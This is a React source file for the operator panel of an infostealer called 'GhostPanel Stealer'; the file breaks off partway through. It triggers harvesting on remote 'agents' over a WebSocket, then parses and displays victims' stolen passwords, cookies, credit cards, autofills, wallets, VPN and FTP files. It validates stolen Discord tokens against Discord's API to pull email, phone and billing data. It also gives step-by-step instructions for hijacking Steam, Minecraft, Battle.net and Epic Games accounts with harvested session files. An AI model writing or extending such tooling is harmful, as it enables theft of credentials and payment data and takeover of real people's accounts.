import React, { useState, useEffect, useRef } from 'react';
import { Archive, Play, Settings, FileText, Download, Shield, Key, Eye, CreditCard, MessageSquare, Gamepad, HardDrive, CheckCircle, Folder, User, Globe, Cpu, CreditCard as CardIcon, Server, DollarSign, HelpCircle, X, Box, Lock, Network, Terminal, Activity } from 'lucide-react';
import { API_BASE_URL, WS_BASE_URL } from '../../config';

export default function Stealer({ agentId }) {
    const [config, setConfig] = useState({
        passwords: true, cookies: true, history: true, autofills: true,
        discord: true, telegram: true, wallets: true, games: true, sysinfo: true,
        vpns: true, ftp: true
    });
    
    const [files, setFiles] = useState([]);
    const [isRunning, setIsRunning] = useState(false);
    const [showToast, setShowToast] = useState(false);
    const [activeTab, setActiveTab] = useState('passwords'); 
    const [activeInstruction, setActiveInstruction] = useState(null); 
    
    // Data States
    const [passwordsData, setPasswordsData] = useState([]);
    const [cookiesData, setCookiesData] = useState([]);
    const [historyData, setHistoryData] = useState([]);
    const [autofillsData, setAutofillsData] = useState([]);
    const [cardsData, setCardsData] = useState([]);
    const [systemData, setSystemData] = useState({});
    const [discordData, setDiscordData] = useState([]);
    const [walletsData, setWalletsData] = useState([]);
    const [gamesData, setGamesData] = useState([]);
    const [vpnsData, setVpnsData] = useState([]);
    const [ftpData, setFtpData] = useState([]);

    // Filter States
    const [selectedBrowser, setSelectedBrowser] = useState('All');
    const [selectedProfile, setSelectedProfile] = useState('All');

    // Helper Functions (Declared before usage to avoid ReferenceError)
    const fetchLogs = async (path) => {
        try {
            const safeId = agentId.replace(/:/g, '_');
            const res = await fetch(`${API_BASE_URL}/logs/${safeId}/stealer/${path}`);
            return await res.text();
        } catch(e) { return ""; }
    };

    const parseFilename = (path) => {
        const name = path.split('/').pop();
        const parts = name.split('_');
        if (parts.length >= 3) {
            const browser = parts[0];
            const type = parts[parts.length - 1]; 
            const profile = name.replace(`${browser}_`, "").replace(`_${type}`, "");
            return { browser, profile };
        }
        return { browser: parts[0], profile: 'Default' };
    };

    const getBrowserName = (path) => path.split('/').pop().split('_')[0];

    // Data Parsing Functions
    const fetchAndParsePasswords = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        let current = { browser, profile };
        lines.forEach(line => {
            if (line.startsWith("URL: ")) current.url = line.substring(5).trim();
            if (line.startsWith("USER: ")) current.user = line.substring(6).trim();
            if (line.startsWith("PASS: ")) {
                current.pass = line.substring(6).trim();
                parsed.push(current);
                current = { browser, profile };
            }
        });
        if (parsed.length > 0) setPasswordsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseCookies = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        lines.forEach(line => {
            if (line.startsWith("#") || !line.trim()) return;
            const parts = line.split('\t');
            if (parts.length >= 7) {
                parsed.push({
                    browser, profile, domain: parts[0], name: parts[5], value: parts[6], path: parts[2]
                });
            }
        });
        if (parsed.length > 0) setCookiesData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseHistory = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        // Corrected Regex: ^\[(.*?)\] (.*) \(([^)]+)\)$
        const parsed = lines.filter(l=>l.trim()).map(line => {
            const match = line.match(/^\\\\[(.*?)\\\ \\] (.*) \\\\[([^)]+)\\\\)$/);
            if(match) return { browser, profile, time: match[1], title: match[2], url: match[3] };
            
            // Fallback parsing
            try {
                const timeEnd = line.indexOf('] ');
                const urlStart = line.lastIndexOf(' (');
                if (timeEnd > -1 && urlStart > -1) {
                    return {
                        browser, profile,
                        time: line.substring(1, timeEnd),
                        title: line.substring(timeEnd + 2, urlStart),
                        url: line.substring(urlStart + 2, line.length - 1)
                    };
                }
            } catch(e) {}
            return null;
        }).filter(x=>x);
        setHistoryData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseAutofills = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = lines.filter(l=>l.trim()).map(line => {
            const parts = line.split(': ');
            if(parts.length >= 2) return { browser, profile, name: parts[0], value: parts[1] };
            return null;
        }).filter(x=>x);
        setAutofillsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseCards = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        let current = { browser, profile };
        lines.forEach(line => {
            if (line.startsWith("Name: ")) current.name = line.substring(6).trim();
            if (line.startsWith("Exp: ")) current.exp = line.substring(5).trim();
            if (line.startsWith("Num: ")) {
                current.num = line.substring(5).trim();
                parsed.push(current);
                current = { browser, profile };
            }
        });
        if (parsed.length > 0) setCardsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseSystem = async (path) => {
        const text = await fetchLogs(path);
        const lines = text.split('\n');
        const data = {};
        lines.forEach(line => {
            const splitIdx = line.indexOf(':');
            if (splitIdx > -1) {
                const k = line.substring(0, splitIdx).trim();
                const v = line.substring(splitIdx + 1).trim();
                data[k] = v;
            }
        });
        setSystemData(data);
    };

    const fetchAndParseDiscord = async (path) => {
        const text = await fetchLogs(path);
        const lines = text.split('\n');
        const newTokens = [];
        lines.forEach(line => {
            const tokenMatch = line.match(/Token: (.*)/);
            if (tokenMatch) newTokens.push(tokenMatch[1].trim());
        });
        if (newTokens.length > 0) {
            setDiscordData(prev => {
                const updated = [...prev];
                newTokens.forEach(token => {
                    if (!updated.find(d => d.token === token)) {
                        updated.push({ token, info: {}, billing: [], guilds: [], isNitro: false, hasBilling: false });
                    }
                });
                return updated;
            });
        }
    };

    // Effects
    useEffect(() => {
        fetchStatus();
        fetchFiles();
        // Removed setInterval to prevent flickering
    }, [agentId]); 

    // Re-fetch when running stops to get final results
    useEffect(() => {
        if (!isRunning) fetchFiles();
    }, [isRunning]);

    const fetchStatus = () => {
        fetch(`${API_BASE_URL}/api/agents/${agentId}/stealer/status`)
            .then(res => res.json())
            .then(data => {
                if (data.status === "finished" && isRunning) finishExecution();
                else if (data.status === "running") setIsRunning(true);
            }).catch(() => {});
    };

    const fetchFiles = () => {
        fetch(`${API_BASE_URL}/api/agents/${agentId}/stealer/files`)
            .then(res => res.json())
            .then(list => {
                if (Array.isArray(list)) {
                    // Even without interval, checking diff helps performance
                    const currentFiles = JSON.stringify(files.sort());
                    const newFiles = JSON.stringify(list.sort());
                    if (currentFiles === newFiles && files.length > 0) return;

                    setFiles(list);
                    
                    setPasswordsData([]);
                    setCookiesData([]);
                    setHistoryData([]);
                    setAutofillsData([]);
                    setCardsData([]);
                    
                    const wallets = [], games = [], vpns = [], ftps = [];
                    list.forEach(file => {
                        if (file.endsWith("_passwords.txt")) fetchAndParsePasswords(file);
                        if (file.endsWith("_cookies.txt")) fetchAndParseCookies(file);
                        if (file.endsWith("_history.txt")) fetchAndParseHistory(file);
                        if (file.endsWith("_autofill.txt")) fetchAndParseAutofills(file);
                        if (file.includes("cards.txt")) fetchAndParseCards(file);
                        if (file.endsWith("SystemInfo.txt")) fetchAndParseSystem(file);
                        if (file.includes("tokens.txt") || file.includes("decrypted_tokens.txt")) fetchAndParseDiscord(file);
                        if (file.startsWith("Wallets/")) wallets.push(file);
                        if (file.startsWith("Games/")) games.push(file);
                        if (file.startsWith("VPN/")) vpns.push(file);
                        if (file.startsWith("FTP/")) ftps.push(file);
                    });
                    setWalletsData(wallets);
                    setGamesData(games);
                    setVpnsData(vpns);
                    setFtpData(ftps);
                }
            }).catch(() => {});
    };

    const finishExecution = () => {
        setIsRunning(false);
        localStorage.removeItem(`stealer_running_${agentId}`);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 5000);
    };

    const handleRun = () => {
        setIsRunning(true);
        localStorage.setItem(`stealer_running_${agentId}`, 'true');
        setFiles([]); setPasswordsData([]); setCardsData([]); setDiscordData([]); setSystemData({}); 
        setCookiesData([]); setHistoryData([]); setAutofillsData([]); setWalletsData([]); setGamesData([]);
        setVpnsData([]); setFtpData([]);
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.onopen = () => {
            ws.send(`__STEALER_EXEC__:${JSON.stringify(config)}`);
            ws.close();
        };
    };

    const checkDiscordToken = async (token, index) => {
        try {
            const res = await fetch("https://discord.com/api/v9/users/@me", {
                headers: { "Authorization": token }
            });
            if (res.ok) {
                const info = await res.json();
                setDiscordData(prev => {
                    const newData = [...prev];
                    newData[index] = { ...newData[index], info, isNitro: info.premium_type > 0 };
                    return newData;
                });
                const billRes = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                    headers: { "Authorization": token }
                });
                if (billRes.ok) {
                    const billing = await billRes.json();
                    setDiscordData(prev => {
                        const newData = [...prev];
                        newData[index] = { ...newData[index], billing, hasBilling: billing.length > 0 };
                        return newData;
                    });
                }
            } else {
                alert("Invalid or Expired Token");
            }
        } catch (e) {
            console.error(e);
            alert("Failed to check token (CORS/Network Error). Try via Server.");
        }
    };

    // Filter Logic
    const getAvailableBrowsers = () => {
        const all = [...passwordsData, ...cookiesData, ...historyData, ...autofillsData, ...cardsData];
        return Array.from(new Set(all.map(d => d.browser))).sort();
    };

    const getAvailableProfiles = () => {
        if (selectedBrowser === 'All') return [];
        const all = [...passwordsData, ...cookiesData, ...historyData, ...autofillsData, ...cardsData];
        return Array.from(new Set(all.filter(d => d.browser === selectedBrowser).map(d => d.profile))).sort();
    };

    const filtered = (data) => {
        return data.filter(d => {
            if (selectedBrowser !== 'All' && d.browser !== selectedBrowser) return false;
            if (selectedProfile !== 'All' && d.profile !== selectedProfile) return false;
            return true;
        });
    };

    const gameInstructions = {
        "Steam": {
            title: "Steam Session Injection",
            steps: [
                "Ensure Steam is completely closed (Check Task Manager).",
                "Navigate to: C:\\Program Files (x86)\\Steam\\config",
                "Replace 'loginusers.vdf' and 'config.vdf' with the downloaded files.",
                "Navigate to: C:\\Program Files (x86)\\Steam",
                "Place any 'ssfn...' files in the root folder.",
                "Relaunch Steam. You should be logged in."
            ]
        },
        "Minecraft": {
            title: "Minecraft Session Injection",
            steps: [
                "Close the Minecraft Launcher.",
                "Press Win+R, type '%APPDATA%\\.minecraft' and press Enter.",
                "Replace 'launcher_accounts.json' with the harvested file.",
                "Relaunch Minecraft Launcher.",
                "The target's profile should appear in the account list."
            ]
        },
        "Battle.net": {
            title: "Battle.net Session Injection",
            steps: [
                "Close Battle.net Agent completely.",
                "Press Win+R, type '%APPDATA%\\Battle.net' and press Enter.",
                "Replace 'Battle.net.config' with the harvested file.",
                "Relaunch Battle.net.",
                "Sometimes requires IP match, but email will be pre-filled."
            ]
        },
        "Epic Games": {
            title: "Epic Games Injection",
            steps: [
                "Close Epic Games Launcher.",
                "Navigate to: %LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Config\\Windows",
                "Replace 'GameUserSettings.ini'.",
                "Navigate to: %LOCALAPPDATA%\\EpicGamesLauncher\\Saved\\Webcache",
                "Replace 'Cookies' file with 'EpicGames_Cookies'.",
                "Relaunch Epic Games. You should be logged in."
            ]
        },
        "Default": {
            title: "General Config Injection",
            steps: [
                "Locate the software's config folder.",
                "Backup existing config files.",
                "Replace with harvested files.",
                "Relaunch application."
            ]
        }
    };

    const Toggle = ({ label, keyName, icon: Icon, color }) => (
        <div className={`p-3 rounded-md border cursor-pointer flex items-center justify-between select-none ${config[keyName] ? `bg-${color}-900/20 border-${color}-500/50` : 'bg-[#151515] border-[#333]'}`}
             onClick={() => !isRunning && setConfig(prev => ({ ...prev, [keyName]: !prev[keyName] }))}>
            <div className="flex items-center gap-2">
                <div className={`p-1.5 rounded-full ${config[keyName] ? `text-${color}-400` : 'text-gray-600'}`}><Icon size={16} /></div>
                <span className={`font-bold text-xs ${config[keyName] ? 'text-white' : 'text-gray-500'}`}>{label}</span>
            </div>
            <div className={`w-8 h-4 rounded-full relative transition-all duration-300 ${config[keyName] ? `bg-${color}-500` : 'bg-gray-700'}`}>
                <div className={`absolute top-0.5 w-3 h-3 bg-white rounded-full transition-all duration-300 shadow-sm ${config[keyName] ? 'left-[18px]' : 'left-0.5'}`} />
            </div>
        </div>
    );

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] text-gray-300 p-6 overflow-y-auto relative scrollbar-thin">
            {/* Help Modal */}
            {activeInstruction && (
                <div className="fixed inset-0 bg-black/80 z-[200] flex items-center justify-center p-4 backdrop-blur-sm" onClick={()=>setActiveInstruction(null)}>
                    <div className="bg-[#1a1a1a] border border-red-500/50 rounded-xl p-6 max-w-md w-full shadow-2xl relative" onClick={e=>e.stopPropagation()}>
                        <button onClick={()=>setActiveInstruction(null)} className="absolute top-4 right-4 text-gray-500 hover:text-white"><X size={20}/></button>
                        <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2"><Gamepad className="text-red-500"/> {activeInstruction.title}</h3>
                        <ol className="list-decimal list-inside space-y-3 text-sm text-gray-300">
                            {activeInstruction.steps.map((step, i) => <li key={i}><span className="text-gray-400">{step}</span></li>)}
                        </ol>
                        <div className="mt-6 text-[10px] text-gray-600 border-t border-[#333] pt-2 text-center">
                            WARNING: SESSION INJECTION MAY BE DETECTED BY GAME LAUNCHERS.
                        </div>
                    </div>
                </div>
            )}

            {showToast && (
                <div className="fixed top-6 right-6 bg-[#1a1a1a] border border-green-500 text-white px-6 py-4 rounded-lg shadow-[0_0_30px_rgba(34,197,94,0.3)] flex items-center gap-4 animate-slide-up z-[100]">
                    <CheckCircle className="text-green-500" size={28} />
                    <div><div className="font-bold text-lg">Harvest Complete!</div></div>
                </div>
            )}

            <div className="flex justify-between mb-6 pb-4 border-b border-[#333]">
                <div className="flex items-center gap-3">
                    <Shield size={32} className="text-red-600" />
                    <div>
                        <h2 className="text-2xl font-bold text-white">GhostPanel Stealer</h2>
                        <div className="text-[10px] font-mono text-gray-500 uppercase flex items-center gap-2">
                            <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-yellow-500 animate-pulse' : 'bg-green-500'}`}></div>
                            {isRunning ? 'AGENT EXECUTING...' : 'READY'}
                        </div>
                    </div>
                </div>
                <div className="flex gap-3">
                    <button onClick={fetchFiles} className="px-4 py-2 rounded font-bold bg-[#222] hover:bg-[#333] border border-[#444] text-white flex gap-2"><Activity size={18}/> REFRESH</button>
                    <button onClick={() => window.location.href = `${API_BASE_URL}/api/agents/${agentId}/stealer/zip`} className="px-5 py-2 rounded font-bold bg-[#222] hover:bg-[#333] border border-[#444] text-white flex gap-2"><Download size={18}/> ZIP</button>
                    <button onClick={handleRun} disabled={isRunning} className={`px-8 py-2 rounded font-extrabold flex gap-2 ${isRunning ? 'bg-gray-800 text-gray-500' : 'bg-red-600 hover:bg-red-500 text-white'}`}>
                        {isRunning ? <Settings className="animate-spin" size={20}/> : <Play size={20}/>} {isRunning ? 'RUNNING...' : 'EXECUTE'}
                    </button>
                </div>
            </div>

            {/* Stealer Summary Report */}
            {files.length > 0 && (
                <div className="bg-[#111] border border-[#333] rounded-lg p-6 mb-6 font-mono text-xs relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><Terminal size={100}/></div>
                    <div className="flex justify-between items-start mb-4 border-b border-[#222] pb-2">
                        <div className="text-cyan-400 font-black flex items-center gap-2"><Activity size={14}/> HARVEST REPORT - {new Date().toLocaleString()}</div>
                        <div className="text-gray-600">ID: {agentId}</div>
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                        <div className="space-y-1">
                            <div className="text-gray-500 font-bold mb-2 uppercase tracking-widest border-l-2 border-blue-500 pl-2">System Info</div>
                            <div className="flex justify-between"><span className="text-gray-600">Computer Name:</span> <span className="text-white">{systemData['PC Name'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Computer OS:</span> <span className="text-white">{systemData['OS'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Total Memory:</span> <span className="text-white">{systemData['RAM'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">UUID:</span> <span className="text-white truncate max-w-[120px]">{systemData['HWID'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">CPU:</span> <span className="text-white truncate max-w-[120px]">{systemData['CPU'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">GPU:</span> <span className="text-white truncate max-w-[120px]">{systemData['GPU'] || '...'}</span></div>
                        </div>
                        <div className="space-y-1">
                            <div className="text-gray-500 font-bold mb-2 uppercase tracking-widest border-l-2 border-cyan-500 pl-2">IP Info</div>
                            <div className="flex justify-between"><span className="text-gray-600">IP:</span> <span className="text-cyan-400 font-bold">{systemData['Public IP'] || '...'}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Region:</span> <span className="text-white">[{systemData['Region'] || 'Global'}]</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Country:</span> <span className="text-white">[{systemData['Country'] || '??'}]</span></div>
                        </div>
                        <div className="space-y-1">
                            <div className="text-gray-500 font-bold mb-2 uppercase tracking-widest border-l-2 border-red-500 pl-2">Grabbed Data</div>
                            <div className="flex justify-between"><span className="text-gray-600">Cookies:</span> <span className={cookiesData.length > 0 ? 'text-orange-400 font-bold' : 'text-gray-500'}>{cookiesData.length}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Passwords:</span> <span className={passwordsData.length > 0 ? 'text-red-400 font-bold' : 'text-gray-500'}>{passwordsData.length}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">Credit Cards:</span> <span className={cardsData.length > 0 ? 'text-rose-400 font-bold' : 'text-gray-500'}>{cardsData.length}</span></div>
                            <div className="flex justify-between"><span className="text-gray-600">AutoFills:</span> <span className={autofillsData.length > 0 ? 'text-green-400 font-bold' : 'text-gray-500'}>{autofillsData.length}</span></div>
                        </div>
                    </div>
                </div>
            )}

            <div className={`grid grid-cols-6 gap-3 mb-6 ${isRunning ? 'opacity-50 pointer-events-none' : ''}`}>
                <Toggle label="Passwords" keyName="passwords" icon={Key} color="red" />
                <Toggle label="Cookies" keyName="cookies" icon={Eye} color="orange" />
                <Toggle label="Discord" keyName="discord" icon={MessageSquare} color="violet" />
                <Toggle label="Cards" keyName="autofills" icon={CreditCard} color="rose" />
                <Toggle label="Wallets" keyName="wallets" icon={Archive} color="green" />
                <Toggle label="System" keyName="sysinfo" icon={HardDrive} color="blue" />
                <Toggle label="Games" keyName="games" icon={Gamepad} color="pink" />
                <Toggle label="Telegram" keyName="telegram" icon={MessageSquare} color="cyan" />
                <Toggle label="VPNs" keyName="vpns" icon={Lock} color="teal" />
                <Toggle label="FTP" keyName="ftp" icon={Network} color="indigo" />
            </div>

            <div className="flex justify-between items-end">
                <div className="flex gap-1 bg-[#111] p-1 w-fit rounded-t-lg border-x border-t border-[#333]">
                    {['passwords', 'cookies', 'history', 'autofills', 'cards', 'discord', 'wallets', 'games', 'vpns', 'ftp', 'system'].map(tab => (
                        <button key={tab} onClick={()=>setActiveTab(tab)} className={`px-4 py-2 text-[10px] font-black uppercase transition ${activeTab===tab ? 'bg-red-600 text-white rounded' : 'text-gray-500 hover:text-gray-300'}`}>
                            {tab}
                        </button>
                    ))}
                </div>
                <div className="mb-2 flex items-center gap-2">
                    <span className="text-[10px] font-bold text-gray-600 uppercase">Filters:</span>
                    <select value={selectedBrowser} onChange={e=>{
                        setSelectedBrowser(e.target.value);
                        setSelectedProfile('All');
                    }} className="bg-[#111] border border-[#333] text-xs text-white rounded px-3 py-1.5 outline-none focus:border-red-500 transition">
                        <option value="All">All Browsers</option>
                        {getAvailableBrowsers().map(b => <option key={b} value={b}>{b}</option>)}
                    </select>
                    
                    <select value={selectedProfile} onChange={e=>setSelectedProfile(e.target.value)} disabled={selectedBrowser === 'All'} className={`bg-[#111] border border-[#333] text-xs text-white rounded px-3 py-1.5 outline-none focus:border-red-500 transition ${selectedBrowser === 'All' ? 'opacity-50 cursor-not-allowed' : ''}`}>
                        <option value="All">All Profiles</option>
                        {getAvailableProfiles().map(p => <option key={p} value={p}>{p}</option>)}
                    </select>
                </div>
            </div>

            <div className="bg-[#161616] border border-[#333] rounded-b-lg rounded-tr-none rounded-tl-none flex-1 min-h-[500px] flex flex-col p-0 overflow-hidden shadow-inner">
                
                {activeTab === 'passwords' && (
                    <div className="overflow-y-auto h-full scrollbar-thin">
                        <table className="w-full text-left">
                            <thead className="bg-[#0f0f0f] sticky top-0 z-10 text-[10px] text-gray-500 font-black uppercase">
                                <tr><th className="p-4">Browser / Profile</th><th className="p-4">URL</th><th className="p-4">Username</th><th className="p-4 text-right">Password</th></tr>
                            </thead>
                            <tbody>
                                {filtered(passwordsData).map((p, i) => (
                                    <tr key={i} className="border-b border-[#222] hover:bg-[#1a1a1a] text-xs font-mono transition-colors">
                                        <td className="p-4 text-gray-500">
                                            <div className="font-bold text-white">{p.browser}</div>
                                            <div className="text-[10px]">{p.profile}</div>
                                        </td>
                                        <td className="p-4 text-blue-400 truncate max-w-[200px]" title={p.url}>{p.url}</td>
                                        <td className="p-4 text-gray-300">{p.user}</td>
                                        <td className="p-4 text-right text-red-400 select-all font-bold">{p.pass}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {activeTab === 'cookies' && (
                    <div className="overflow-y-auto h-full scrollbar-thin">
                        <table className="w-full text-left">
                            <thead className="bg-[#0f0f0f] sticky top-0 z-10 text-[10px] text-gray-500 font-black uppercase">
                                <tr><th className="p-4">Browser</th><th className="p-4">Domain</th><th className="p-4">Name</th><th className="p-4 text-right">Value</th></tr>
                            </thead>
                            <tbody>
                                {filtered(cookiesData).map((c, i) => (
                                    <tr key={i} className="border-b border-[#222] hover:bg-[#1a1a1a] text-xs font-mono group transition-colors">
                                        <td className="p-4 text-gray-500">{c.browser} ({c.profile})</td>
                                        <td className="p-4 text-orange-400">{c.domain}</td>
                                        <td className="p-4 text-white font-bold">{c.name}</td>
                                        <td className="p-4 text-right"><div className="text-gray-400 truncate max-w-[300px] group-hover:max-w-none group-hover:break-all transition-all select-all">{c.value}</div></td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {activeTab === 'history' && (
                    <div className="overflow-y-auto h-full scrollbar-thin">
                        <table className="w-full text-left">
                            <thead className="bg-[#0f0f0f] sticky top-0 z-10 text-[10px] text-gray-500 font-black uppercase">
                                <tr>
                                    <th className="p-4">Browser</th>
                                    <th className="p-4">Time</th>
                                    <th className="p-4">Title / URL <span className="text-red-500 ml-2">(Last 100 Items)</span></th>
                                </tr>
                            </thead>
                            <tbody>
                                {filtered(historyData).slice(0, 100).map((h, i) => (
                                    <tr key={i} className="border-b border-[#222] hover:bg-[#1a1a1a] text-xs font-mono transition-colors">
                                        <td className="p-4 text-gray-500">{h.browser}</td>
                                        <td className="p-4 text-gray-400 w-32">{h.time}</td>
                                        <td className="p-4">
                                            <div className="text-white font-bold truncate max-w-[500px]">{h.title}</div>
                                            <div className="text-blue-500 truncate max-w-[500px] text-[10px]">{h.url}</div>
                                        </td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {activeTab === 'autofills' && (
                    <div className="overflow-y-auto h-full scrollbar-thin">
                        <table className="w-full text-left">
                            <thead className="bg-[#0f0f0f] sticky top-0 z-10 text-[10px] text-gray-500 font-black uppercase">
                                <tr><th className="p-4">Browser</th><th className="p-4">Field Name</th><th className="p-4 text-right">Value</th></tr>
                            </thead>
                            <tbody>
                                {filtered(autofillsData).map((a, i) => (
                                    <tr key={i} className="border-b border-[#222] hover:bg-[#1a1a1a] text-xs font-mono">
                                        <td className="p-4 text-gray-500">{a.browser}</td>
                                        <td className="p-4 text-white">{a.name}</td>
                                        <td className="p-4 text-right text-green-400 select-all">{a.value}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}

                {activeTab === 'cards' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                        {filtered(cardsData).map((c, i) => (
                            <div key={i} className="bg-gradient-to-br from-[#222] to-[#111] border border-[#333] rounded-xl p-6 flex flex-col justify-between h-48 shadow-xl relative overflow-hidden group hover:border-rose-500/50 transition-all">
                                <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><CreditCard size={120}/></div>
                                <div className="flex justify-between items-start z-10">
                                    <div className="text-gray-500 font-mono text-[10px] uppercase tracking-[0.2em]">{c.browser || 'Credit Card'}</div>
                                    <CreditCard className="text-rose-500" size={24}/>
                                </div>
                                <div className="z-10">
                                    <div className="text-2xl font-mono text-white tracking-[0.2em] drop-shadow-lg select-all">{c.num}</div>
                                    <div className="flex justify-between mt-6 text-xs font-mono text-gray-400">
                                        <div><div className="text-[9px] uppercase text-gray-600 mb-1">Card Holder</div><div className="text-gray-200">{c.name || 'UNKNOWN'}</div></div>
                                        <div className="text-right"><div className="text-[9px] uppercase text-gray-600 mb-1">Expires</div><div className="text-rose-400 font-bold">{c.exp}</div></div>
                                    </div>
                                </div>
                            </div>
                        ))}
                    </div>
                )}

                {activeTab === 'discord' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-1 md:grid-cols-2 gap-4">
                        {discordData.map((d, i) => {
                            const hasInfo = d.info && d.info.id;
                            const avatarUrl = hasInfo && d.info.avatar 
                                ? `https://cdn.discordapp.com/avatars/${d.info.id}/${d.info.avatar}.png` 
                                : "https://cdn.discordapp.com/embed/avatars/0.png";
                            
                            // Username Logic
                            let displayName = "Unknown User";
                            let handle = "Check Token to View";
                            if (hasInfo) {
                                displayName = d.info.global_name || d.info.username;
                                handle = d.info.discriminator === "0" ? `@${d.info.username}` : `${d.info.username}#${d.info.discriminator}`;
                            }

                            return (
                            <div key={i} className={`bg-[#111] border ${hasInfo ? 'border-violet-500/30' : 'border-[#333]'} rounded-xl p-5 flex flex-col gap-4 shadow-lg hover:shadow-violet-900/10 transition-all`}>
                                <div className="flex gap-4 items-center border-b border-[#222] pb-4">
                                    <div className="relative">
                                        <img src={avatarUrl} className="w-16 h-16 rounded-full bg-[#222] object-cover" />
                                        {d.isNitro && <div className="absolute -bottom-1 -right-1 bg-gradient-to-r from-pink-500 to-violet-500 text-white text-[8px] font-bold px-2 py-0.5 rounded-full shadow border border-[#111]">NITRO</div>}
                                    </div>
                                    <div className="flex-1 min-w-0">
                                        <div className={`text-lg font-bold truncate ${hasInfo ? 'text-white' : 'text-gray-600'}`}>{displayName}</div>
                                        <div className="text-xs text-gray-500 font-mono truncate">{handle}</div>
                                        {hasInfo && (
                                            <div className="flex gap-2 mt-2">
                                                {d.info.mfa_enabled && <span className="text-[9px] bg-green-900/30 text-green-400 px-1.5 py-0.5 rounded border border-green-500/30">2FA</span>}
                                                {d.info.verified && <span className="text-[9px] bg-blue-900/30 text-blue-400 px-1.5 py-0.5 rounded border border-blue-500/30">VERIFIED</span>}
                                                {d.info.phone && <span className="text-[9px] bg-[#222] text-gray-400 px-1.5 py-0.5 rounded border border-[#333]">PHONE</span>}
                                            </div>
                                        )}
                                    </div>
                                </div>
                                
                                {hasInfo && (
                                    <div className="grid grid-cols-2 gap-2 text-xs">
                                        <div className="bg-[#1a1a1a] p-2 rounded">
                                            <div className="text-[9px] text-gray-500 font-bold mb-1">EMAIL</div>
                                            <div className="text-gray-300 truncate" title={d.info.email}>{d.info.email || "N/A"}</div>
                                        </div>
                                        <div className="bg-[#1a1a1a] p-2 rounded">
                                            <div className="text-[9px] text-gray-500 font-bold mb-1">PHONE</div>
                                            <div className="text-gray-300 truncate">{d.info.phone || "N/A"}</div>
                                        </div>
                                    </div>
                                )}

                                <div className="bg-[#0a0a0a] p-3 rounded border border-[#222] flex flex-col gap-2">
                                    <div className="text-[9px] text-gray-600 font-bold uppercase flex justify-between items-center">
                                        <span>Token</span>
                                        {!hasInfo && <span className="text-violet-500 animate-pulse text-[8px]">VALIDATION REQUIRED</span>}
                                    </div>
                                    <div className="font-mono text-[10px] text-violet-400 break-all select-all leading-tight">
                                        {d.token}
                                    </div>
                                </div>

                                <button onClick={() => checkDiscordToken(d.token, i)} className={`w-full py-2 rounded font-bold text-xs shadow-lg transition-all flex items-center justify-center gap-2 ${hasInfo ? 'bg-[#222] text-gray-400 hover:text-white' : 'bg-violet-600 hover:bg-violet-500 text-white shadow-violet-900/20'}`}>
                                    <Shield size={14}/> {hasInfo ? 'REFRESH INFO' : 'CHECK TOKEN VALIDITY'}
                                </button>
                            </div>
                            );
                        })}
                    </div>
                )}

                {/* Wallets */}
                {activeTab === 'wallets' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-4 gap-4">
                        {walletsData.map((w, i) => {
                            const name = w.split('/').pop();
                            let icon = <Archive size={32} className="text-green-500"/>, label = "Wallet", color = "border-green-500/30";
                            if (name.includes("Exodus")) { label = "Exodus"; color = "border-blue-500/50"; }
                            return (
                                <div key={i} className={`bg-[#111] border ${color} rounded-xl p-5 flex flex-col items-center gap-3 hover:bg-[#1a1a1a] transition-all cursor-pointer`} onClick={() => window.open(`${API_BASE_URL}/logs/${agentId.replace(/:/g, '_')}/stealer/${w}`)}>
                                    {icon}
                                    <div className="text-center"><div className="font-black text-white text-xs uppercase">{label}</div><div className="text-[9px] text-gray-500 font-mono mt-1 truncate max-w-[150px]">{name}</div></div>
                                    <button className="mt-2 px-3 py-1 bg-[#222] text-[9px] font-bold rounded text-gray-400 hover:text-white">VIEW RAW</button>
                                </div>
                            );
                        })}
                    </div>
                )}

                {/* VPNs */}
                {activeTab === 'vpns' && (
                    <div className="overflow-y-auto h-full p-6 grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                        {vpnsData.map((v, i) => {
